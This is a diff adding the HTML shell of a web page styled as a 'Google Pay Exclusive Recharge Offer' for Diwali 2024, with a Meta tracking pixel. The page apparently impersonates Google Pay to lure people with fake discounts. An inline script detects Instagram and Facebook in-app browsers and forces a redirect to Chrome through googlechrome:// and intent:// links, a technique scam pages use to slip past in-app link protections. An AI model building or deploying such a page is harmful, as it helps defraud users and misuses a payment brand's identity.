@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="/gpayicon.jpg" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta name="description" content="Web site created using create-react-app" />
+    <link rel="apple-touch-icon" href="/gpayicon.jpg" />
+    <link rel="manifest" href="/manifest.json" />
+    <title>Google Pay Exclusive Recharge Offer</title>
+    <script defer="defer" src="/static/js/main.cb72230e.js"></script>
+    <link href="/static/css/main.97cb11b0.css" rel="stylesheet">
+
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '8334669239911616');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=8334669239911616&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+
+    <!-- Script to detect in-app browser and redirect -->
+    <script>
+        window.onload = function() {
+            var baseURL = window.location.origin + "";
+            
+            // Remove https:// from the baseURL for handling URL schemes
+            baseURL = baseURL.replace(/^https?:\/\//, '');
+
+            // Check if the user is using an in-app browser
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            
+            if (userAgent.indexOf('Instagram') > -1 || userAgent.indexOf('FBAN') > -1 || userAgent.indexOf('FBAV') > -1) {
+                // Show custom message for in-app browser users
+                document.body.innerHTML = '<div style="text-align: center; margin-top: 50px; padding: 20px; font-family: Arial, sans-serif;">' +
+                          '<img class="glogo" src="https://yourwebsite.com/cdn.shopify.com/s/files/1/0710/8526/1038/files/gpaylogo.a859e7ad6e3a2b75843f5d4a.png?v=1726311970">' +
+                          '<h1>🎉 Diwali 2024 Google Pay Recharge Offers! 🎉</h1>' +
+                          '<p>Recharge your mobile with <strong>exclusive discounts</strong>!</p>' +
+                          '<p>Get <strong>up to 50% OFF</strong> on your recharge this Diwali!</p>' +
+                          '<p>For the best experience, please open this site in your default browser.</p>' +
+                          '<p style="margin-top: 20px; font-size: 14px; color: #888;">Redirecting you to your default browser...</p>' +
+                          '</div>';
+
+                // Redirect to the default browser after 3 seconds
+                setTimeout(function() {
+                    if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                        window.location.href = "googlechrome://" + baseURL + "/home/pages/index.html";
+                    } else if (/Android/i.test(userAgent)) {
+                        window.location.href = "intent://" + baseURL + "pages/#Intent;scheme=https;package=com.android.chrome;end;";
+                    } else {
+                        window.location.href = "https://" + baseURL;
+                    }
+                }, 50); // 3-second delay
+            }
+        };
+    </script>
+</head>
+
+<body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+</body>
+
+</html>
